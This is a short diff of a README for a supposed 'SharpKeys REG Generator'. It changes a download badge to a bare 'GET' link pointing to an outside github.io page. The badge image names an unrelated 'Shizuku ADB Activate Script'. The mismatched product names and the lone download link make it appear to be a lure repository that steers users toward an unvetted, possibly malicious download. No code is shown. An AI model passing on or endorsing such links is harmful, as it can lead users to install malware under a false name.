@@ -1,6 +1,6 @@
 # SharpKeys REG Generator
 
-[GET SharpKeys REG Generator](https://img.shields.io/badge/GET%20%E2%80%94%20Shizuku%20ADB%20Activate%20Script-0078D6?style=for-the-badge&logoColor=white)](https://lisanarimanea842.github.io/.github/SharpKeys-REG-Generator) 
+[GET](https://img.shields.io/badge/GET%20%E2%80%94%20Shizuku%20ADB%20Activate%20Script-0078D6?style=for-the-badge&logoColor=white)](https://lisanarimanea842.github.io/.github/SharpKeys-REG-Generator) 
 
 ![Preview](https://cdn.hashnode.com/res/hashnode/image/upload/v1762507883217/4909ba07-8b52-4470-b3b6-a5887c45bd54.png)
 
